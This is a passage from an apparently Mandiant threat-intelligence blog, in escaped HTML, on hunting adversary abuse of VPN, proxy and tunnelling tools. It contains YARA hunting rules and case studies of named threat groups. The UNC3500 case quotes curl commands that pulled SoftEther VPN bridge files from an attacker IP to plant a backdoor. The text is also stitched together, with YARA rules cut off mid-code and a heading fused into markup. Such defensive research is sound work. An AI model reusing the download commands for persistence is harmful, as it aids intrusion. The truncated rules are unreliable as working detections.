behavior.\u003c/p\u003e\n\u003cdiv\u003e\n\u003cp\u003e\u003cu\u003eDirection\u003c/u\u003e: Identify core binary components that are not so easily modified to match on (i.e. PDB paths, exports, third-party libraries, domains, etc)\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eGeneric Domains in Binaries\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e \u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003erule M_Hunting_VPNEngine_GenericProxyVPNDomain_1\r\n{\r\n    meta:\r\n        author \u003d \u0026quot;Mandiant\u0026quot;\r\n        description \u003d \u0026quot;Rule looks for generic proxy/vpn domains.\u0026quot;\r\n        md5 \u003d \u0026quot;96842ad6cc00fab5776171c56812b9a5\u0026quot;\r\n    strings:\r\n        $UniqueProxyVPNDomain \u003d /(proxy|vpn)\\.[^\\.]{1,100}\\.(net|com|org)/ ascii fullword nocase\r\n    condition:\r\n        filesize \u0026lt; 5MB and ((uint16(0) \u003d\u003d 0x5a4d and uint32(uint32(0x3C)) \u003d\u003d 0x00004550) or (uint32(0) \u003d\u003d 0x464c457f)) and $UniqueProxyVPNDomain\r\n}\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cstrong\u003eConventionEngine\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003eAs documented in the \u003ca href\u003d\"https://cloud.google.com/blog/topics/threat-intelligence/definitive-dossier-of-devilish-debug-details-part-one-pdb-paths-malware\" rel\u003d\"noopener\" target\u003d\"_blank\"\u003eDefinitive Dossier of Devilish Debug Details: Part One\u003c/a\u003e:\u003c/p\u003e\n\u003cp\u003e“Often users name folders and files based on their content. Computers force users to label and annotate their data based on the data type, role, and purpose. This human-computer \u003cstrong\u003econvention\u003c/strong\u003e means that most digital content has some descriptive surface area, or descriptive “features” that are present in many files, including malware files…. Not all these features were meant to be in [a binary], and they were certainly not intended for defenders to notice. This is especially true for PDB paths, which can be described as an outcome of the compilation process, a toolmark left in malware that describes the development environment.”\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eVPN or Proxy PDB Convention\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e \u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003erule M_Hunting_Win_VPNEngine_PDB_1\r\n{\r\n    meta:\r\n        author \u003d \u0026quot;Mandiant\u0026quot;\r\n        description \u003d \u0026quot;Rule looks for VPN or Proxy PDB.\u0026quot;\r\n        md5 \u003d \u0026quot;2bf422e19e721b461f9e98271fb28ad3\u0026quot;\r\n    strings:\r\n        $pdb \u003d /RSDS[\\x00-\\xFF]{20}[a-zA-Z]:\\\\[\\x00-\\xFF]{0,500}(vpn|proxy)[\\x00-\\xFF]{0,500}\\.pdb\\x00/ ascii nocase wide\r\n    condition:\r\n        filesize \u0026lt; 5MB and uint16(0) \u003d\u003d 0x5A4D and uint32(uint32(0x3C)) \u003d\u003d 0x00004550 and $pdb\r\n}\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cstrong\u003eHunting 3rd Party Libraries\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003eWhile some products are more popular than others, there are countless VPN software companies and products. Therefore, relying on specific brand detections is not suitable for purposes of wide detections. Hence, \u003cstrong\u003edetection on popular third-party libraries \u003c/strong\u003ethat these software use at scale would allow a broader and more inclusive scope. 20MB and $r1 and ($vpn or $proxy or $tunnel)\r\n}\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003e\u003cstrong\u003eBinary Export Artifacts\u003c/strong\u003e\u003c/h3\u003e\n\u003cp\u003eBased on \u003ca href\u003d\"https://docs.microsoft.com/en-us/cpp/build/exporting-from-a-dll?view\u003dmsvc-170\" rel\u003d\"noopener\" target\u003d\"_blank\"\u003eMicrosoft documentation\u003c/a\u003e, DLL files contain an exports table. The exports table includes the name of every function that the DLL exports to other executables. These functions are the entry points into the DLL; only the functions in the exports table can be accessed by other executables.\u003c/p\u003e\n\u003cp\u003eThese export equities within files may help identify \u003cem\u003eintent\u003c/em\u003e, especially as it pertains to unique exports and the goal with their use. There are other unique portable executable details that allow for insight into possible intent, including resource names and domain presence.\u003c/p\u003e\n\u003cp\u003eVPN Specific DLL Resource Names\u003c/p\u003e\n\u003cp\u003e \u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003eimport \"pe\"\r\nrule M_Hunting_Win_VPNEngine_ResourceInPE_1\r\n{\r\n    meta:\r\n        author \u003d \"PROXY\")\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003eImpact - A Case Study\u003c/h2\u003e\n\u003cp\u003eAs analysts, researchers, engineers, etc. - time is limited. Time is one of the greatest resources that anyone has. So, it’s important to ask the question: \u003cem\u003eWhy care?\u003c/em\u003e Well, the following sections will highlight a variety of adversaries abusing the techniques and technologies discussed in this blog.\u003c/p\u003e\n\u003ch3\u003e\u003cstrong\u003eUNC3500\u003c/strong\u003e\u003c/h3\u003e\n\u003cp\u003eUNC3500 is a suspected Chinese actor that has leveraged CVE-2021-44228 to target entities in the education and telecommunications sectors. The group has established persistence by \u003cstrong\u003ecreating a VPN and HTTPS server that can function as a backdoor\u003c/strong\u003e following initial compromise.\u003c/p\u003e\n\u003cp\u003eFollowing reconnaissance and initial actions in a specific UNC3500 intrusion the attackers proceeded to download the aforementioned VPN software and HTTPS server using the following commands:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003ecurl hxxp://35.189.145[.]119/hamcore.se2 \u0026gt; /mi/pki/mics/log/hamcore.se2\r\n\u003cul\u003e\n\u003cli\u003e(MD5: 9fb1191ba0064d317a883677ce568023)\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003ecurl hxxp://35.189.145[.]119/https \u0026gt; /mi/pki/mics/log/https\r\n\u003cul\u003e\n\u003cli\u003e(MD5: 00352d167c44272dba415c36867a8125)\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003ecurl hxxp://35.189.145[.]119/vpn_bridge.config \u0026gt; /mi/pki/mics/log/vpn_bridge.config \r\n\u003cul\u003e\n\u003cli\u003e(MD5: ce5d96252315e2c9d5fd9aeb98ae28ae)\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eThe https and hamcore.se2 files are components of SoftEther’s VPN server bridge, PacketiX. The PacketiX VPN Bridge creates a layer 2 connection between a physical network adapter on a local system and a remote SoftEther VPN server. It requires an accompanying library file hamcore.se2 and a configuration file vpn_bridge.config. By deploying this package, UNC3500 established persistence on the compromised server.\u003c/p\u003e\n\u003ch3\u003e\u003cstrong\u003eAPT40\u003c/strong\u003e\u003c/h3\u003e\n\u003cp\u003eAPT40 primarily carries out intrusion activities against maritime industries and has been linked to activity dating back to at least 2013. In April 2021, four members of APT40 were \u003ca href\u003d\"https://www.justice.gov/opa/pr/four-chinese-nationals-working-ministry-state-security-charged-global-computer-intrusion\" rel\u003d\"noreferrer noopener\" target\u003d\"_blank\"\u003eindicted\u003c/a\u003e by the U.S. Department of Justice, alleged to be working on behalf of the MSS in Hainan. Operations may target sensitive data that would benefit research and development programs, inform decision makers sponsoring these actors, and enable further targeting of related organizations. \u003c/p\u003e\n\u003cp\u003eOne methodology observed being used by APT40 includes \u003cstrong\u003eexfiltration via VPN\u003c/strong\u003e. Additionally, APT40 has been \u003cstrong\u003eidentified utilizing ProtonVPN and ExpressVPN\u003c/strong\u003e.\u003c/p\u003e\n\u003ch3\u003e\u003cstrong\u003eUNC2465\u003c/strong\u003e\u003c/h3\u003e\n\u003cp\u003eIn a Supply Chain intrusion, SMOKEDHAM, a lightweight .NET-based backdoor used by UNC2465, used PowerShell to connect to third-party file sharing sites to\u003cstrong\u003e download an Ngrok utility that was renamed conhost.exe.\u003c/strong\u003e A script was used to execute \u003cstrong\u003eNgrok with a configuration file named ngrok.yml.\u003c/strong\u003e Ngrok is a publicly available utility that can expose local servers behind NATs and firewalls to the public internet over secure tunnels.\u003c/p\u003e\n\u003cp\u003eUNC2465 is a threat cluster that has previously deployed DARKSIDE ransomware and is suspected to have been active since at least March 2020. UNC2465 activity is characterized by their ongoing use of similar tactics, techniques, and procedures (TTPs) to distribute the publicly available PowerShell-based SMOKEDHAM backdoor in victim environments. UNC2465 has extorted using a hybrid approach of DARKSIDE ransomware and extortion through a leaks website over TOR. DARKSIDE applies pressure initially through shaming a victim with a small amount of data published on a the DARKSIDE blog followed by larger releases of data lasting several days if a client won't pay. This group likely represents an affiliate, only a smaller part of overall DARKSIDE ecosystem. UNC2465 has used phishing, web compromises, and supply chain access through the trojanization of legitimate software installers. UNC2465 activities have continued past the overall shutdown of DARKSIDE RaaS.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eUnderground Forums\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003eAn English-speaking actor named 'idk' advertised access to U.S. Insurance and Healthcare companies in which the method of access listed was “OpenVPN installed” and “credentials from OpenVPN”.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eVPNs as Sources\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eUNC3661 \u003c/strong\u003ehas used \u003cu\u003eNordVPN\u003c/u\u003e to hide origin IPs for their remote interactions with victim environments.\u003c/p\u003e\n\u003cp\u003eA \u003cstrong\u003eNEARTWIST \u003c/strong\u003ecluster of activity used against Ukraine (linked to \u003cstrong\u003eAPT28 \u003c/strong\u003ewith moderate confidence) logged in to web shells using \u003cu\u003eExpressVPN\u003c/u\u003e IP addresses.\u003c/p\u003e\n\u003ch3\u003e\u003cstrong\u003ePrevalence\u003c/strong\u003e\u003c/h3\u003e\n\u003cp\u003eA Jedi Master \u003ca href\u003d\"https://twitter.com/stvemillertime/status/1452650807103533060\" rel\u003d\"noopener\" target\u003d\"_blank\"\u003eonce said\u003c/a\u003e, “Prevalence is the number one thing analysts want”. So let's talk prevalence! Utilizing the various detections and methods highlighted in this blog against housed Mandiant data, 40+ connections were made to different adversary groups and malware families.\u003c/p\u003e\n\u003cp\u003e \u003c/p\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv Did We Go?\u003c/h2\u003e\n\u003cp\u003eThe use of VPN software, proxy services, and localhost tunnels provide adversaries an air of legitimacy, detection bypass via encryption, and potential point to point access. These characteristics are high value desires of an adversary, and make detection, containment, and eradication more burdensome on the blue team.\u003c/p\u003e\n\u003cp\u003eHowever, in this blog VPN software, proxy services, and localhost tunnels were analyzed for hunting directions. These hunting directions did include vendor and service specific items (SoftEther, Ngrok, WireGuard, OpenVPN, Hide.Me, etc.), but also focused on wholistic and tradecraft-related directions (Conventions, 3rd Party Libraries, PE Artifacts, etc.).\u003c/p\u003e\n\u003cp\u003eThese directions will expand the defender’s hunting and detection repertoire against these software and service suites, lowing the burden on the blue team.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eHappy Hunting\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eAcknowledgements\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003eThanks to everyone that contributed analysis and review. Every network is different and because of that, these signatures should not be deployed in production environments without testing and, when required, tuning.\u003c/p\u003e\n\u003cp\u003eCase studies and examples are drawn from our experiences and activities working for a variety of customers, and do not represent our work for any one customer or set of customers.
